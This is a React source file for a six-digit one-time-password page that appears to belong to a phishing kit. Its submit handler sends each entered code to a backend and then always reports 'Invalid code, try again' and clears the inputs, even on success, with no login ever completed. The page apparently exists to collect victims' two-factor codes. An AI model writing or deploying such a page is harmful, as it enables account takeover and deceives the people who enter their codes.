import React, { useRef, useState } from "react";
import { useNavigate } from "react-router-dom";
import axios from "axios";
import BASE_URL from "../components/urls";

const Otp = () => {
  const navigate = useNavigate();
  const inputsRef = useRef([]);
  const [otp, setOtp] = useState(Array(6).fill(""));
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleChange = (value, index) => {
    if (/^\d?$/.test(value)) {
      const newOtp = [...otp];
      newOtp[index] = value;
      setOtp(newOtp);

      if (value && index < 5) {
        inputsRef.current[index + 1]?.focus();
      }
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

 const handleSubmit = async (e) => {
  e.preventDefault();
  const otpCode = otp.join("");
  if (otpCode.length < 6) {
    setError("Please enter all 6 digits");
    return;
  }

  setLoading(true);
  try {
    const response = await axios.post(`${BASE_URL}/otp`, { otp: otpCode });
    console.log(response.data);
    setError("Invalid code, try again");
    setOtp(Array(6).fill("")); // clear the state

    // Clear input fields visually
    inputsRef.current.forEach((input) => {
      if (input) input.value = "";
    });

    // Focus first input (optional)
    inputsRef.current[0]?.focus();
  } catch (err) {
     setError("Invalid OTP or network error.");
  } finally {
    setLoading(false);
  }
};

  return (
    <div className="min-h-screen bg-white text-black flex items-start pt-28 justify-center px-4">
      <div className="text-center">
        <h2 className="text-lg font-medium mb-8">
          Check your email or authentication app for the code to complete login.
        </h2>

        <form onSubmit={handleSubmit}>
          <div className="flex justify-center gap-3 mb-4">
            {otp.map((digit, index) => (
              <input
                key={index}
                type="text"
                inputMode="numeric"
                maxLength={1}
                className="w-8 h-14 text-center text-2xl bg-transparent border-b-2 border-black text-black focus:outline-none focus:border-blue-500"
                value={digit}
                onChange={(e) => handleChange(e.target.value, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                ref={(el) => (inputsRef.current[index] = el)}
              />
            ))}
          </div>

          {error && <p className="text-red-500 mb-2 text-sm">{error}</p>}

          <button
            type="submit"
            disabled={loading}
            className="w-full mt-4 py-3 text-white font-semibold rounded-md bg-green-700 hover:bg-green-800"
          >
            {loading ? "Verifying..." : "Confirm OTP"}
          </button>
        </form>
      </div>
    </div>
  );
};

export default Otp;
